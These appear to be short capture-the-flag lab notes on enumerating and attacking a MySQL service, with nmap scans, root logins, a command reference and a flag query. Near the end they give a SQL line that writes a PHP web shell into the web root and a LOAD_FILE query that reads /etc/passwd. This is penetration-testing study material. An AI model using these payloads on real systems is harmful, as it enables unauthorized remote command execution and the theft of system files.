```
sudo nmap 10.129.142.253 -sV -sC -p3306 --script mysql*
```

```
mysql -u root -h 10.129.14.132

mysql -u root -pP4SSw0rd -h 10.129.14.128
```

-- and \# are used for comments

use mysql;
show tables;
use sys;
show tables;
select host, unique_users from Host_summary;


The AND, OR and NOT operators can also be represented as &&, ||, and !.

Command	Description
```
mysql -u <user> -p<password> -h <IP address>	Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.
show databases;	Show all databases.
use <database>;	Select one of the existing databases.
show tables;	Show all available tables in the selected database.
show columns from <table>;	Show all columns in the selected database.
select * from <table>;	Show everything in the desired table.
select * from <table> where <column> = "<string>";	Search for needed string in the desired table.
```


ran this in the gui to get the flag
```
select * from accounts.dbo.devsacc
where name = 'htb'
```

if empty, the variable is able to write
```
show variables like "secure_file_priv";
```

you can write to a local file on the server
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

```
mysql> select LOAD_FILE("/etc/passwd");

```



Read local files with MySQL
```
mysql> select LOAD_FILE("/etc/passwd");
```